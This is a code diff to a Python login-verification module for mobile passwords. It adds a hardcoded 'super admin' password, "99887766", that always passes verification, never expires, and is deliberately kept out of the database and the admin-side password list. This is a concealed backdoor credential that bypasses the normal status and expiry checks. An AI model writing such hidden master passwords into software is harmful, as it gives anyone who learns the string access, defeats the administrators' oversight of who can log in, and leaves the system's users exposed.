@@ -9,6 +9,9 @@ from sqlalchemy import or_
 from app.extensions import db
 from app.models import MobileLoginPassword
 
+# 移动端超管口令（不入库、不在管理端口令列表展示）
+MOBILE_SUPER_ADMIN_PASSWORD = "99887766"
+
 # 上次执行过期检查的时间（避免每次验证都检查）
 _last_expire_check_time: datetime | None = None
 # 过期检查间隔（秒）
@@ -41,8 +44,15 @@ def expire_due_passwords() -> None:
     _last_expire_check_time = now
 
 
+def is_super_admin_password(plain: str) -> bool:
+    """是否为内置超管口令（永不过期，不写入口令池表）。"""
+    return bool(plain) and plain == MOBILE_SUPER_ADMIN_PASSWORD
+
+
 def verify_password_plain(plain: str) -> bool:
-    """口令存在、状态正常且未过期则返回 True。"""
+    """口令存在、状态正常且未过期则返回 True；内置超管口令始终有效。"""
+    if is_super_admin_password(plain):
+        return True
     now = datetime.utcnow()
     row = (
         MobileLoginPassword.query.filter(
